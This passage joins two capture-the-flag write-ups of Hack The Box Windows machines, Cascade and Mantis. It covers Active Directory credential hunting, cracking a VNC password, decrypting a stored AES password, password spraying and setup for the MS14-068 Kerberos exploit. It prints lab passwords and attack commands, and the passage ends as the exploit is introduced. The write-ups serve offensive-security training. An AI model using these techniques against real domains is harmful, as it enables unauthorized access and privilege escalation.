<p><em>Since it has an</em> <code class="language-plaintext highlighter-rouge">=</code> <em>at the end,</em> we try to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code></p>

<p><img src="/assets/Cascade/ldap-uniq-attrib-pass-decoded.jpg" alt="ldap-uniq-attrib-pass-decoded" /></p>

<p>This attribute belonged to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user.</p>

<p>Authentication succeded with it. But we didn’t get code execution with <strong>WinRM</strong> :/</p>

<p><img src="/assets/Cascade/ryan-creds-check.jpg" alt="ryan-creds-check" /></p>

<h3 id="kerberoasting">Kerberoasting</h3>
<p><em>Applying the same strategy as before,</em> we’re going to <strong>kerberoast.</strong></p>

<p><img src="/assets/Cascade/kerberoasting.jpg" alt="kerberoasting" /></p>

<p>No results there.</p>

<h3 id="smb-access-with-rthompson">SMB Access with <code class="language-plaintext highlighter-rouge">R.Thompson</code></h3>
<p>We’re going to use a <code class="language-plaintext highlighter-rouge">crackmapexec</code> module called <code class="language-plaintext highlighter-rouge">spider_plus</code>.</p>

<p>It essentially crawls the <code class="language-plaintext highlighter-rouge">SMB</code> share and returns a list of files that we have access to.</p>

<p><img src="/assets/Cascade/cme-spider-plus.jpg" alt="cme-spider-plus" /></p>

<p>Here’s what it found:</p>

<p><img src="/assets/Cascade/cme-spider-plus-results.jpg" alt="cme-spider-plus-results" /></p>

<p><em>In the</em> <code class="language-plaintext highlighter-rouge">Data</code> <em>share,</em> the contents of the <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code> were interesting:</p>

<p><img src="/assets/Cascade/email-contents.jpg" alt="email-contents" /></p>

<p><em>According to the mail,</em> a user called <code class="language-plaintext highlighter-rouge">TempAdmin</code> which has the same password as the normal admin (<code class="language-plaintext highlighter-rouge">Administrator</code> <em>probably</em>) should be deleted at the end of 2018.</p>

<p>We note this down and make sure to be on the lookout for any information regarding that user.</p>

<p>When we look at the <code class="language-plaintext highlighter-rouge">ArkAdRecycleBin.log</code> we get a confirmation that the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user has in fact been deleted.</p>

<p><img src="/assets/Cascade/ark-ad-recycle-bin.jpg" alt="ark-ad-recycle-bin" /></p>

<p>We find something very intersting in the <code class="language-plaintext highlighter-rouge">VNC Install.reg</code> file:</p>

<p><img src="/assets/Cascade/tight-vnc-password.jpg" alt="tight-vnc-password" /></p>

<h3 id="cracking-vnc-passwords">Cracking VNC Passwords</h3>
<p>We’re interested in cracking this <strong>VNC</strong> password and reusing it.</p>

<p><em>Luckily,</em> a tool called <code class="language-plaintext highlighter-rouge">vncpwd</code> (https://github.com/jeroennijhof/vncpwd) can easily do that.</p>

<p>we clone the repo using <code class="language-plaintext highlighter-rouge">git clone https://github.com/jeroennijhof/vncpwd</code> and follow up with a <code class="language-plaintext highlighter-rouge">make</code> command to build it.</p>

<p>We then get the hex string, reverse it with <code class="language-plaintext highlighter-rouge">xxd</code> using the <code class="language-plaintext highlighter-rouge">-r</code> and <code class="language-plaintext highlighter-rouge">-p</code> flags and decrypt it.</p>

<p><img src="/assets/Cascade/vnc-pwd-cracked.jpg" alt="vnc-pwd-cracked" /></p>

<h3 id="password-reuse">Password Reuse</h3>
<p><em>Having a new password</em> <code class="language-plaintext highlighter-rouge">sT333ve2</code>, we’re going to to spray it all over the domain users we’ve collected.</p>

<p><img src="/assets/Cascade/steve-ad-user-owned.jpg" alt="steve-ad-user-owned" /></p>

<p><em>As expected,</em> the password belonged to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</p>

<p>He also has <strong>WinRM</strong> access :D</p>

<p><img src="/assets/Cascade/steve-winrm-access.jpg" alt="steve-winrm-access" /></p>

<p>The user flag is the only significant thing that we found using his shell access.</p>

<p>Running <strong>WinPeas</strong> didn’t pick up anything either. So we took a step back to check his <strong>SMB</strong> access.</p>

<h3 id="steves-smb-access-the-audit-share">Steve’s SMB access: The <code class="language-plaintext highlighter-rouge">Audit$</code> Share</h3>
<p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--shares</code> flag, we get the below:</p>

<p><img src="/assets/Cascade/steve-smb-access.jpg" alt="steve-smb-access" /></p>

<p>we mount the share with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=s.smith,password=sT333ve2'</span> //10.10.10.182/Audit<span class="nv">$ </span>/mnt
</code></pre></div></div>

<p>and list the files with:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /mnt <span class="nt">-type</span> f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="/assets/Cascade/mount-and-find.jpg" alt="mount-and-find" /></p>

<p>Checking the <code class="language-plaintext highlighter-rouge">.bat</code> file, we find that the executable <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> runs with a database as an argument <code class="language-plaintext highlighter-rouge">"\\CASC-DC1\Audit$\DB\Audit.db"</code></p>

<p><img src="/assets/Cascade/audit-bat-file.jpg" alt="audit-bat-file" /></p>

<p><em>From the</em> <strong>SQLite</strong> <code class="language-plaintext highlighter-rouge">.dll</code> <em>files,</em> we infer that the <code class="language-plaintext highlighter-rouge">.db</code> file is of that type.</p>

<p>We confirm that with <code class="language-plaintext highlighter-rouge">file</code>:</p>

<p><img src="/assets/Cascade/check-out-the-db.jpg" alt="check-out-the-db" /></p>

<h3 id="db-enumeration">DB Enumeration</h3>
<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sqlite3</code> command-line utility to check out the database contents.</p>

<ol>
  <li>we list the tables with: <code class="language-plaintext highlighter-rouge">.tables</code></li>
  <li>we get the schema using <code class="language-plaintext highlighter-rouge">.schema</code></li>
  <li>we select everything from the <code class="language-plaintext highlighter-rouge">Ldap</code> table after noticing the <code class="language-plaintext highlighter-rouge">pwd</code> field.</li>
  <li>no new data was found in <code class="language-plaintext highlighter-rouge">DeletedUserAudit</code> table.</li>
  <li>same for the <code class="language-plaintext highlighter-rouge">Misc</code> table as well.</li>
</ol>

<p><img src="/assets/Cascade/sqlite-db-enumeration.jpg" alt="sqlite-db-enumeration" /></p>

<p>The password we found in the <code class="language-plaintext highlighter-rouge">Ldap</code> table appears to be for the <code class="language-plaintext highlighter-rouge">ArkSvc</code> user.</p>

<p>Decoding it as base-64 gives us strange output. It must be encrypted.</p>

<p><img src="/assets/Cascade/ark-svc-b64-attempt.jpg" alt="ark-svc-b64-attempt" /></p>

<h3 id="reversing-the-cascauditexe-and-dll-files">Reversing the <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">.dll</code> files</h3>
<p><em>Since the</em> <code class="language-plaintext highlighter-rouge">.bat</code> <em>file showed the</em> <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> <em>processing the Audit database,</em> we’re interested to know how it works.</p>

<p>The same goes for <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>. <em>Judging by its name,</em> it’s very likely related to the encryption.</p>

<p>Doing a <code class="language-plaintext highlighter-rouge">file</code> command against the <code class="language-plaintext highlighter-rouge">CascAudit</code> files tells us they are built with <code class="language-plaintext highlighter-rouge">.Net</code></p>

<p><img src="/assets/Cascade/inspecting-cascaudit-files.jpg" alt="inspecting-cascaudit-files" /></p>

<p><em>Because of an amazing tool called</em> <code class="language-plaintext highlighter-rouge">DNSpy</code> (https://github.com/dnSpy/dnSpy), reversing <code class="language-plaintext highlighter-rouge">.Net</code> is simple.</p>

<p>Opening the <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> with <code class="language-plaintext highlighter-rouge">DNSpy.exe</code> shows two important functions: <code class="language-plaintext highlighter-rouge">EncryptString</code> and <code class="language-plaintext highlighter-rouge">DecryptString</code></p>

<p><img src="/assets/Cascade/dnspy-casc-crypto-dll.jpg" alt="dnspy-casc-crypto-dll" /></p>

<p>A great deal of information is present regarding the encryption:</p>
<ol>
  <li><strong>Type:</strong> AES</li>
  <li><strong>Block Size:</strong> 128-bit</li>
  <li><strong>Key Size:</strong> 128-bit</li>
  <li><strong>Initialization Vector (IV):</strong> <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code></li>
  <li><strong>Mode:</strong> CBC</li>
</ol>

<p>We need just the key to be able to decrypt the <code class="language-plaintext highlighter-rouge">ArkSvc</code> password found in the DB. Or so we hope :D</p>

<p>We find the it in the <code class="language-plaintext highlighter-rouge">.exe</code> code</p>

<p><img src="/assets/Cascade/dnspy-casc-exe.jpg" alt="dnspy-casc-exe" /></p>

<p>it’s <strong>“c4scadek3y654321”</strong></p>

<p><em>Looking at the code,</em> it seems that the <code class="language-plaintext highlighter-rouge">.exe</code> reads the encrypted password from the database and decrypts it using the <code class="language-plaintext highlighter-rouge">DecryptString</code> function before moving on to carry out its tasks.</p>

<h3 id="aes-cbc-128-decryption">AES-CBC-128 Decryption</h3>
<p><em>Adding the details we found into an</em> <strong>online decryption tool</strong> (https://www.devglan.com/online-tools/aes-encryption-decryption), we get the plaintext: <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code></p>

<p><img src="/assets/Cascade/aes-cbc-128-decryption.jpg" alt="aes-cbc-128-decryption" /></p>

<h3 id="arksvc-and-the-ad-recycle-bin">ArkSvc and the AD Recycle Bin</h3>
<p>The user <code class="language-plaintext highlighter-rouge">ArkSvc</code> authenticates successfully with the <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code> password and also has <code class="language-plaintext highlighter-rouge">WinRM</code> access.</p>

<p><img src="/assets/Cascade/ark-svc-got-winrm.jpg" alt="ark-svc-got-winrm" /></p>

<p><em>While doing some basic privesc checks</em>, we notice that the group membership of this user is unique:</p>

<p><img src="/assets/Cascade/ark-svc-group-membership.jpg" alt="ark-svc-group-membership" /></p>

<p><code class="language-plaintext highlighter-rouge">s.smith</code> didn’t have this access.</p>

<p><img src="/assets/Cascade/s-smith-group-membership.jpg" alt="s-smith-group-membership" /></p>

<p>The <strong>Recycle Bin</strong> of <strong>Active Directory</strong> is important in our case because it contains the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>

<p>We don’t know his password yet. But it might be similar to any of the ones we found.</p>

<p>We try restoring him using <code class="language-plaintext highlighter-rouge">PowerShell</code></p>

<p>The command has 3 parts:</p>
<ol>
  <li>Fetching all deleted objects: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects</code></li>
  <li>Selecting the last one (TempAdmin): <code class="language-plaintext highlighter-rouge">Select -Last 1 </code></li>
  <li>Restoring It: <code class="language-plaintext highlighter-rouge">Restore-ADObject</code></li>
</ol>

<p><img src="/assets/Cascade/attempting-tempadmin-restore.jpg" alt="attempting-tempadmin-restore" /></p>

<p>But that fails :/</p>

<p>I scratch my head for a while…</p>

<p>But eventually get the idea of checking all the attributes for the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>

<p>Just in case his password was in one of them. Just like the <code class="language-plaintext highlighter-rouge">r.thompson</code> user or something.</p>

<p><strong>Command:</strong></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-ldapFilter</span><span class="p">:</span><span class="s2">"(msDS-LastKnownRDN=*)"</span><span class="w"> </span><span class="nt">-IncludeDeletedObjects</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Last</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/Cascade/temp-admin-password.jpg" alt="temp-admin-password" /></p>

<p>Son of a … It was indeed the case XD</p>

<p><em>And of course,</em> it was base-64 encoded.</p>

<p>We decode it and try it with the <code class="language-plaintext highlighter-rouge">Administrator</code> user as mentioned in the email:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username is TempAdmin (password is the same as the normal admin account password)
</code></pre></div></div>

<p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>

<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="https://omnisl4sh.github.io/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/06/Mantis</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Windows Domain Controller</strong> machine. We find a <em>hidden credentials file</em> when directory bruteforcing <strong>IIS</strong> on a <em>custom</em> port.</li>
  <li>The file gives us information about the <strong>MSSQL database</strong> (the username and DB name) in plain text while the password is present in the file name as a <em>base-64 encoded hex</em> string.</li>
  <li><em>Using the credentials found,</em> we gain access to the <strong>MSSQL database</strong> which contains the password for a user called <code class="language-plaintext highlighter-rouge">james</code> who is an AD user.</li>
  <li><em>With</em> <code class="language-plaintext highlighter-rouge">james</code>’s <em>credentials,</em> we’re able to exploit <strong>Kerberos</strong> with a known <strong>CVE (MS14-068) a.k.a Pykek</strong> to <em>forge</em> a <strong>Domain Admin</strong> ticket.</li>
  <li><em>Using the ticket with kerberos authentication,</em> we can execute commands on the box as a <strong>Domain Administrator</strong> to gain <strong>full access</strong>.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-05-03 18:53:51Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-05-03T18:51:03
|_Not valid after:  2052-05-03T18:51:03
|_ssl-date: 2022-05-03T18:55:01+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
49180/tcp open  msrpc        Microsoft Windows RPC
49184/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
|_ssl-date: 2022-05-03T18:55:01+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-05-03T18:51:03
|_Not valid after:  2052-05-03T18:51:03
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 34m16s, deviation: 1h30m43s, median: 0s
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-03T18:54:52
|_  start_date: 2022-05-03T18:49:33
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2022-05-03T14:54:51-04:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
</code></pre></div></div>

<ul>
  <li>A full port scan shows us a set ports indicative of a <strong>Domain Controller</strong> (DNS, Kerberos, LDAP, SMB, LDAP GC).</li>
  <li>We notice the computer name is <code class="language-plaintext highlighter-rouge">Mantis</code></li>
  <li>The domain name to be <code class="language-plaintext highlighter-rouge">htb.local</code></li>
  <li>from the <code class="language-plaintext highlighter-rouge">nmap</code> <code class="language-plaintext highlighter-rouge">smb-os-discovery</code> script, the operating system of the machine is <strong>Windows Server 2008 R2</strong>.</li>
  <li>We also see <strong>MSSQL</strong> on its standard port: 1443</li>
  <li>We take note that <strong>IIS 7.5</strong> is running on both port 1337 (<em>which is interesting</em>) and on port 8080.</li>
</ul>

<h3 id="smb-enumeration">SMB Enumeration</h3>
<p>We try enumerating <strong>SMB</strong> with <em>different authentication methods</em> using <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
<ol>
  <li>Null</li>
  <li>Anonymous</li>
  <li>Guest</li>
</ol>

<p><img src="/assets/Mantis/smb-enum.jpg" alt="smb-enum" /></p>

<p>without success.</p>

<h3 id="ldap-enumeration">LDAP Enumeration</h3>
<p>Using <code class="language-plaintext highlighter-rouge">ldapsearch</code>, we don’t get much information either :/</p>

<p><img src="/assets/Mantis/ldapsearch-output.jpg" alt="ldapsearch-output" /></p>

<h3 id="kerberos-enumeration">Kerberos Enumeration</h3>
<p>Enumerating kerberos with <code class="language-plaintext highlighter-rouge">kerbrute</code> gave us one user: <code class="language-plaintext highlighter-rouge">james</code></p>

<p><img src="/assets/Mantis/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>

<h3 id="asreproasting-james">ASREPRoasting James</h3>
<p><code class="language-plaintext highlighter-rouge">james</code> wasn’t asreproastable.</p>

<p><img src="/assets/Mantis/james-not-asreproastable.jpg" alt="james-not-asreproastable" /></p>

<h3 id="port-8080">Port 8080</h3>
<p>Checking out port 8080 showed a <strong>CMS</strong> called <strong>Orchard CMS</strong>  as detected by <code class="language-plaintext highlighter-rouge">wappalyzer</code>.</p>

<p><img src="/assets/Mantis/orchard-cms.jpg" alt="orchard-cms" /></p>

<p><em>Testing for weak credentials</em> with both the <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">james</code> users failed :/</p>

<p><img src="/assets/Mantis/orchard-test-default-creds.jpg" alt="orchard-test-default-creds" /></p>

<h3 id="port-1337">Port 1337</h3>
<p>This port was interesting because of its number.</p>

<p><em>And, since it was</em> <strong>IIS 7.5</strong>, I wanted to test out a certain vulnerability called the <strong>IIS Tilde Vulnerability</strong>.</p>

<p><em>Briefly,</em> it can <em>disclose the first 6 characters of file/folder names</em> on this version of <strong>IIS.</strong></p>

<p>I tried the <strong>MetaSploit</strong> module and it showed those results:</p>

<p><img src="/assets/Mantis/iis-tilde-vuln.jpg" alt="iis-tilde-vuln" /></p>

<p>The <code class="language-plaintext highlighter-rouge">secure*~</code> file/directory seemed interesting enough. So, I went ahead for directory bruteforcing using <code class="language-plaintext highlighter-rouge">gobuster</code> and the <code class="language-plaintext highlighter-rouge">directory-list-lowercase-2.3-medium.txt</code> wordlist.</p>

<p>Note: I used the lowercase wordlist since we’re bruteforcing <strong>Windows</strong> which isn’t case sensitive like <strong>Linux.</strong></p>

<p><img src="/assets/Mantis/gobuster-output-1337.jpg" alt="gobuster-output-1337" /></p>

<p>The full name for the directory was <code class="language-plaintext highlighter-rouge">secure_notes</code>. It had the below contents:</p>

<p><img src="/assets/Mantis/1337-secure-notes-contents.jpg" alt="1337-secure-notes-contents" /></p>

<p>The <code class="language-plaintext highlighter-rouge">web.config</code> file didn’t exist.</p>

<p>But both the name and contents of <code class="language-plaintext highlighter-rouge">dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</code> were interesting:</p>

<p><img src="/assets/Mantis/dev_notes_top.jpg" alt="dev_notes_top" /></p>

<p>We could tell:</p>
<ol>
  <li>The username is <code class="language-plaintext highlighter-rouge">admin</code></li>
  <li>The DB name is <code class="language-plaintext highlighter-rouge">orcharddb</code></li>
</ol>

<p>and…</p>

<p><em>By taking a closer look at the file name,</em> the string <code class="language-plaintext highlighter-rouge">NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx</code> could be the <em>missing piece of the puzzle</em>: the password for the <code class="language-plaintext highlighter-rouge">orcharddb</code>’s <code class="language-plaintext highlighter-rouge">admin</code> user.</p>

<h3 id="cyberchef-knew-the-recipe-d">CyberChef knew the recipe :D</h3>
<p><code class="language-plaintext highlighter-rouge">CyberChef</code> is an amazing tool that is intelligent enough to discover if a string of text has undergone encryption/encoding.</p>

<p>Using it revealed that the text was <strong>base64-encoded</strong> after being converted into <strong>hexadecimal</strong>:</p>

<p><img src="/assets/Mantis/cyber-chef-magic-wand-1.jpg" alt="cyber-chef-magic-wand-1" /></p>

<p><img src="/assets/Mantis/cyber-chef-magic-wand-2.jpg" alt="cyber-chef-magic-wand-2" /></p>

<p><img src="/assets/Mantis/cyber-chef-awesomeness.jpg" alt="cyber-chef-awesomeness" /></p>

<p>The password turned out to be <code class="language-plaintext highlighter-rouge">m$$ql_S@_P@ssW0rd!</code></p>

<h3 id="interacting-with-mssql-and-db-enumeration">Interacting with MSSQL and DB Enumeration</h3>
<p><em>Using another awesome</em> <strong>Impacket</strong> <em>python script:</em> <code class="language-plaintext highlighter-rouge">mssqlclient.py</code>, we are able to interact with the <strong>MSSQL DB</strong> command prompt from our Linux machine:</p>

<p><img src="/assets/Mantis/mssql-client-py-help.jpg" alt="mssql-client-py-help" /></p>

<p><img src="/assets/Mantis/mssql-client-py-connected.jpg" alt="mssql-client-py-connected" /></p>

<p>We’re going to enumerate the tables in the <code class="language-plaintext highlighter-rouge">orcharddb</code> database first using: <code class="language-plaintext highlighter-rouge">SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES</code></p>

<p><img src="/assets/Mantis/orcharddb-tables.jpg" alt="orcharddb-tables" /></p>

<p>The table <code class="language-plaintext highlighter-rouge">blog_Orchard_Users_UserPartRecord</code> seemed interesting. So, we did a select on it: <code class="language-plaintext highlighter-rouge">select * from blog_Orchard_Users_UserPartRecord</code></p>

<p><img src="/assets/Mantis/james-password-db-cleartext.jpg" alt="james-password-db-cleartext" /></p>

<p>and we’re greeted with a clear-text password for james :D</p>

<h3 id="post-cred-checks">Post-Cred Checks</h3>
<p><em>Having tested the creds from the</em> <code class="language-plaintext highlighter-rouge">james</code> <em>user,</em> and found them valid and we went on to more enumeration/attacks.</p>

<p><img src="/assets/Mantis/james-creds-validated-cme.jpg" alt="james-creds-validated-cme" /></p>

<ol>
  <li>New <strong>SMB</strong> Access</li>
  <li><strong>GPP</strong></li>
  <li>Full AD user enumeration + Password Pattern Recognition &gt; Password Policy Enumeration &gt; Password Spraying</li>
  <li>Full AD <strong>ASREPRoast</strong></li>
  <li><strong>Kerberoast</strong></li>
  <li><strong>BloodHound</strong></li>
  <li><strong>MS14-068</strong></li>
</ol>

<p>Note: <em>we won’t be trying</em> <strong>PowerShell Remoting</strong> <em>since the</em> <strong>WinRM</strong> <em>port wasn’t open in our full nmap.</em></p>

<p><em>We’re going to try everything that doesn’t require</em> <strong>code execution</strong> <em>on the box.</em></p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. New <strong>SMB</strong> Access had the standard <code class="language-plaintext highlighter-rouge">READ</code> access on <code class="language-plaintext highlighter-rouge">SYSVOL</code> and <code class="language-plaintext highlighter-rouge">NETLOGON</code> shares.</li>
</ul>

<p><img src="/assets/Mantis/james-smb-access.jpg" alt="james-smb-access" /></p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. <strong>GPP</strong></li>
</ul>

<p><img src="/assets/Mantis/gpp-enumeration.jpg" alt="gpp-enumeration" /></p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Full AD user enumeration + Password Pattern Recognition &gt; Password Policy Enumeration &gt; Password Spraying</li>
</ul>

<p><img src="/assets/Mantis/full-ad-userlist.jpg" alt="full-ad-userlist" /></p>

<p>Going by the same pattern for the <code class="language-plaintext highlighter-rouge">james</code> user on his password <code class="language-plaintext highlighter-rouge">J@m3s_P@ssW0rd!</code>, the password for the <code class="language-plaintext highlighter-rouge">Administrator</code> should be something like:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Adm1n_P@ssw0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">@dm1n_P@ssw0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">Adm!n_P@ssw0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">@dm!n_P@ssw0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">Adm1n_P@$$w0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">@dm1n_P@$$w0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">Adm!n_P@$$w0rd!</code></li>
  <li><code class="language-plaintext highlighter-rouge">@dm!n_P@$$w0rd!</code></li>
</ul>

<p><em>But before trying anything,</em> we’re going to enumerate the <strong>Password Policy</strong>:</p>

<p><img src="/assets/Mantis/cme-pass-pol.jpg" alt="cme-pass-pol" /></p>

<p>Seems alright to bruteforce the <code class="language-plaintext highlighter-rouge">Administrator</code> :D</p>

<p><img src="/assets/Mantis/admin-brute-force.jpg" alt="admin-brute-force" /></p>

<p>But no luck there I guess XD</p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Full AD <strong>ASREPRoast</strong></li>
</ul>

<p><img src="/assets/Mantis/full-ad-asreproast.jpg" alt="full-ad-asreproast" /></p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. <strong>Kerberoast</strong></li>
</ul>

<p><img src="/assets/Mantis/kerberoast.jpg" alt="kerberoast" /></p>

<ul class="task-list">
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. <strong>Bloodhound</strong></li>
</ul>

<p>All collection methods:</p>

<p><img src="/assets/Mantis/bloodhound-py.jpg" alt="bloodhound-py" /></p>

<p>Neo4j DB Initialization + BloodHound (–no-sandbox)</p>

<p><img src="/assets/Mantis/bloodhound-initialization.jpg" alt="bloodhound-initialization" /></p>

<p>We find nothing special there apart from <strong>RDP Privilege</strong> to the DC:</p>

<p><img src="/assets/Mantis/james-can-rdp-the-dc.jpg" alt="james-can-rdp-the-dc" /></p>

<h3 id="ms14-068-aka-pykek-the-kill-d">MS14-068 a.k.a Pykek (The Kill :D)</h3>
<p><strong>MS14-068</strong> is a vulnerability that affects most Domain Controllers before Server 2016.</p>

<p>In short, it gives us the ability to forge our own kerberos ticket allowing us to have group memberships in whatever high-privilege groups we want (<em>ex: Domain Admins, Enterprise Admins etc.</em>)</p>

<ul>
  <li>A full article on it here (https://adsecurity.org/?p=541)</li>
  <li>The Microsoft Reference that details the affected versions there (https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068)</li>
</ul>

<p><em>Looking at the GitHub PoC</em> (https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek), It only needs:</p>
<ol>
  <li>A valid AD user</li>
  <li>His SID</li>
</ol>

